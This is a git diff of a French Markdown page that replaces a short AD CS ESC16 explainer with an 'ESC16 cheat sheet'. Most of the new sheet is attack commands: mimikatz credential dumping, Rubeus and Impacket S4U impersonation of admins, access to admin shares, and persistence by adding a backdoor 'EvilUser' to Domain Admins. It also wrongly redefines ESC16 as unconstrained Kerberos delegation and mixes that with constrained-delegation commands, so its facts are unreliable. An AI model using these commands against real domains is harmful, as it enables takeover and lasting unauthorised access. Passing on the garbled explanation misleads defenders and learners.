@@ -4,58 +4,199 @@ date: "2025-07-15"
 draft: false
 ---
 
-# 🛡️ ESC16
+# 🎯 ESC16 - Cheat Sheet
 
-## Qu'est-ce que la vulnérabilité ESC16 ?
+## 🎯 Vue d'ensemble
+ESC16 (Escalation 16) est une technique d'escalade de privilèges Active Directory qui exploite les délégations Kerberos non contraintes pour obtenir des privilèges élevés.
 
-**ESC16** est une vulnérabilité liée à l'Active Directory Certificate Services (AD CS) permettant à un attaquant d'obtenir des privilèges élevés en abusant de mauvaises configurations sur l'autorité de certification.
+---
 
-## 🎯 Objectifs pédagogiques
+## 🔍 Détection et Énumération
 
-- Comprendre le fonctionnement d'AD CS et des certificats dans AD
-- Savoir comment l'attaque ESC16 est réalisée
-- Identifier les risques liés à la délégation de droits sur les templates de certificats
+### Identification des Délégations Non Contraintes
+```powershell
+# Recherche des comptes avec délégation non contrainte
+# Pourquoi : Identifier les comptes vulnérables à ESC16
+Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName
 
-## 📋 Exemples de vulnérabilités et exploitation
+# Recherche avec PowerView
+# Pourquoi : Utiliser PowerView pour une énumération avancée
+Get-NetUser -TrustedToAuth | Select-Object samaccountname,useraccountcontrol
 
-### Vulnérabilités courantes
-
-- **Templates de certificats mal configurés** : Permettent à des utilisateurs non privilégiés de demander des certificats avec des droits élevés.
-- **Extensions dangereuses activées** : Possibilité de demander des certificats pour n'importe quel utilisateur (ESC1, ESC2, ESC8, ESC13, ESC16, etc.).
-
-### Scénario d'exploitation
-
-1. **Identification d'un template vulnérable** :
-   - L'attaquant repère un template de certificat qui permet l'inscription par des utilisateurs standards et l'option "ENROLLEE SUPPLIES SUBJECT".
-2. **Demande d'un certificat d'administrateur** :
-   - L'attaquant demande un certificat pour un compte administrateur en spécifiant son propre nom d'utilisateur dans le champ subject.
-3. **Utilisation du certificat pour s'authentifier** :
-   - L'attaquant utilise le certificat obtenu pour s'authentifier en tant qu'administrateur.
-
-### Commandes d'exploitation avec Certipy
-
-```bash
-# Enumérer les templates vulnérables
-certipy-ad find -u user -p 'Password123!' -dc-ip 10.10.10.2 -domain ad.local
-
-# Demander un certificat pour un compte admin
-certipy-ad req -u user -p 'Password123!' -ca ca.ad.local -template vuln_template -upn admin@ad.local -dc-ip 10.10.10.2
-
-# Utiliser le certificat pour s'authentifier
-certipy-ad auth -u admin@ad.local -p '' -key admin.pfx -dc-ip 10.10.10.2
+# Recherche avec LDAP
+# Pourquoi : Utiliser LDAP pour une recherche directe
+ldapsearch -H ldap://DC_IP -D "DOMAIN\USER" -w PASSWORD -b "DC=DOMAIN,DC=LOCAL" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName
 ```
 
-## 🛡️ Bonnes pratiques
+### Énumération des Relations
+```powershell
+# Recherche des relations de délégation
+# Pourquoi : Identifier les relations entre les comptes et les services
+Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName,MemberOf
 
-- Restreindre les droits d'inscription sur les templates de certificats
-- Désactiver les extensions dangereuses sur les templates
-- Auditer régulièrement la configuration d'AD CS
+# Recherche des groupes avec délégation
+# Pourquoi : Identifier les groupes avec des privilèges de délégation
+Get-ADGroup -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName,Members
+```
 
-## 📚 Ressources utiles
+---
 
-- [HackTricks - ESC16](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-cs-esc1-esc13#esc16)
-- [Certipy - ESC16](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
-- [Microsoft - AD CS](https://learn.microsoft.com/fr-fr/windows-server/identity/ad-cs/)
+## 🛠️ Outils d'Exploitation
+
+### Rubeus
+```powershell
+# Exploitation avec Rubeus
+# Pourquoi : Utiliser Rubeus pour l'exploitation des délégations
+Rubeus.exe s4u /user:DELEGATED_USER /rc4:HASH /impersonateuser:ADMIN_USER /msdsspn:cifs/TARGET_SERVER /ptt
+
+# Exploitation avec ticket existant
+# Pourquoi : Utiliser un ticket existant pour l'exploitation
+Rubeus.exe s4u /user:DELEGATED_USER /ticket:TICKET_B64 /impersonateuser:ADMIN_USER /msdsspn:cifs/TARGET_SERVER /ptt
+
+# Exploitation avec mot de passe
+# Pourquoi : Utiliser le mot de passe du compte délégué
+Rubeus.exe s4u /user:DELEGATED_USER /password:PASSWORD /impersonateuser:ADMIN_USER /msdsspn:cifs/TARGET_SERVER /ptt
+```
+
+### Impacket
+```bash
+# Exploitation avec getST
+# Pourquoi : Utiliser Impacket pour l'exploitation des délégations
+getST.py -spn cifs/TARGET_SERVER -impersonate ADMIN_USER DOMAIN/DELEGATED_USER:PASSWORD
+
+# Exploitation avec hashes
+# Pourquoi : Utiliser des hashes pour l'authentification
+getST.py -spn cifs/TARGET_SERVER -impersonate ADMIN_USER -hashes LMHASH:NTHASH DOMAIN/DELEGATED_USER
+
+# Exploitation avec ticket
+# Pourquoi : Utiliser un ticket existant
+getST.py -spn cifs/TARGET_SERVER -impersonate ADMIN_USER -k -no-pass DOMAIN/DELEGATED_USER
+```
+
+### PowerShell
+```powershell
+# Exploitation avec PowerShell
+# Pourquoi : Utiliser PowerShell pour l'exploitation des délégations
+$cred = Get-Credential -UserName "DELEGATED_USER" -Message "Enter credentials"
+$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "cifs/TARGET_SERVER"
+```
+
+---
+
+## 🎯 Techniques d'Exploitation
+
+### Étape 1: Identification de la Cible
+```powershell
+# Identifier le compte avec délégation non contrainte
+# Pourquoi : Trouver un compte vulnérable à ESC16
+$delegatedUser = Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName | Select-Object -First 1
+
+# Identifier la cible de privilèges
+# Pourquoi : Identifier le compte cible pour l'impersonation
+$targetUser = Get-ADUser -Filter {admincount -eq $true} -Properties admincount,SamAccountName | Select-Object -First 1
+```
+
+### Étape 2: Obtenir les Credentials
+```powershell
+# Obtenir le hash du compte délégué
+# Pourquoi : Obtenir les credentials nécessaires pour l'exploitation
+mimikatz # sekurlsa::logonpasswords
+# Ou utiliser d'autres techniques comme Kerberoasting
+```
+
+### Étape 3: Exploitation de la Délégation
+```powershell
+# Utiliser Rubeus pour l'exploitation
+# Pourquoi : Exploiter la délégation pour obtenir un ticket d'administrateur
+Rubeus.exe s4u /user:$delegatedUser.SamAccountName /rc4:HASH /impersonateuser:$targetUser.SamAccountName /msdsspn:cifs/TARGET_SERVER /ptt
+
+# Utiliser Impacket pour l'exploitation
+# Pourquoi : Alternative avec Impacket
+getST.py -spn cifs/TARGET_SERVER -impersonate $targetUser.SamAccountName DOMAIN/$delegatedUser.SamAccountName:PASSWORD
+```
+
+### Étape 4: Utilisation des Privilèges
+```powershell
+# Utiliser le ticket obtenu
+# Pourquoi : Utiliser les privilèges obtenus pour accéder aux ressources
+klist
+# Le ticket est maintenant dans le cache Kerberos
+
+# Accéder à la ressource cible
+# Pourquoi : Accéder à la ressource avec les privilèges élevés
+net use \\TARGET_SERVER\C$ /user:$targetUser.SamAccountName
+```
+
+---
+
+## 🔧 Post-Exploitation
+
+### Persistance
+```powershell
+# Création de comptes persistants
+# Pourquoi : Maintenir l'accès après l'exploitation
+New-ADUser -Name "EvilUser" -AccountPassword (ConvertTo-SecureString "EvilPass123!" -AsPlainText -Force) -Enabled $true
+Add-ADGroupMember -Identity "DOMAIN ADMINS" -Members "EvilUser"
+
+# Modification des ACLs
+# Pourquoi : Modifier les permissions pour maintenir l'accès
+Set-ADObject -Identity "CN=EvilUser,CN=Users,DC=domain,DC=local" -Add @{msDS-AllowedToDelegateTo="krbtgt/DOMAIN.LOCAL"}
+```
+
+### Énumération Avancée
+```powershell
+# Énumération des privilèges obtenus
+# Pourquoi : Comprendre l'étendue des privilèges obtenus
+whoami /priv
+whoami /groups
+
+# Énumération des ressources accessibles
+# Pourquoi : Identifier les ressources accessibles avec les nouveaux privilèges
+Get-ADComputer -Filter * | ForEach-Object { Test-Path "\\$($_.Name)\C$" }
+```
+
+---
+
+## 🛡️ Contre-Mesures
+
+### Détection
+```powershell
+# Surveillance des délégations non contraintes
+# Pourquoi : Détecter les comptes avec des délégations non contraintes
+Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation,SamAccountName | Export-Csv -Path "unconstrained_delegation.csv"
+
+# Surveillance des événements Kerberos
+# Pourquoi : Détecter les tentatives d'exploitation de délégation
+Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} | Where-Object {$_.Message -like "*S4U2Self*"}
+```
+
+### Mitigation
+```powershell
+# Suppression des délégations non contraintes
+# Pourquoi : Supprimer les délégations non contraintes dangereuses
+Set-ADUser -Identity "DELEGATED_USER" -TrustedForDelegation $false
+
+# Configuration de délégations contraintes
+# Pourquoi : Utiliser des délégations contraintes au lieu de non contraintes
+Set-ADUser -Identity "DELEGATED_USER" -Add @{msDS-AllowedToDelegateTo="cifs/TARGET_SERVER"}
+```
+
+### Configuration Sécurisée
+```powershell
+# Politiques de sécurité pour les délégations
+# Pourquoi : Configurer des politiques pour limiter les délégations
+# GPO: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
+# "Network security: LAN Manager authentication level" = "Send NTLMv2 response only. Refuse LM & NTLM"
+```
+
+---
+
+## 📚 Ressources
+
+- **HackTricks ESC16** : https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation
+- **BloodHound ESC16** : https://bloodhound.readthedocs.io/en/latest/data-analysis/attack-paths.html#unconstrained-delegation
+- **Rubeus GitHub** : https://github.com/GhostPack/Rubeus
+- **Impacket GitHub** : https://github.com/SecureAuthCorp/impacket
 
 ---
 
